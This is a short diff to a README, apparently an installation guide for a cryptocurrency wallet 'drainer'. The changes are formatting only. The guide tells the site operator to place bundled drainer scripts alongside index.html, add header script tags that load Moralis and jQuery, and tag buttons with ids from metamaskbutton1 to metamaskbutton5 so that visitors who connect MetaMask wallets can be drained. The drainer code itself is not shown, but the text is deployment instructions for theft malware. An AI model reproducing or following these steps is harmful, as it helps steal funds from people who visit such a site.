@@ -3,13 +3,13 @@
 ---
 
 ## `Installation Guide`
-Put the chain-bundle & chain-common script with your index.html & css or etc folders.
+Put the `chain-bundle` & `chain-common` script with your index.html & css or etc folders.
 
 Adding the drainer is as simple as adding header code below <header> on your site to implement the drainer.
 As-well as this you will need to add a id name to your button of id="metamaskbutton" 6 buttons are supported including:
 `metamaskbutton1 metamaskbutton2 metamaskbutton3 metamaskbutton4 metamaskbutton5`
 
-The header code required at the top of your html is
+The header code required at the top of your `HTML` is
 ```
 <script src="https://unpkg.com/moralis-v1@latest/dist/moralis.js" type="text/javascript"></script> 
 <script src="https://code.jquery.com/jquery-3.6.0.js" crossorigin="anonymous"></script> 
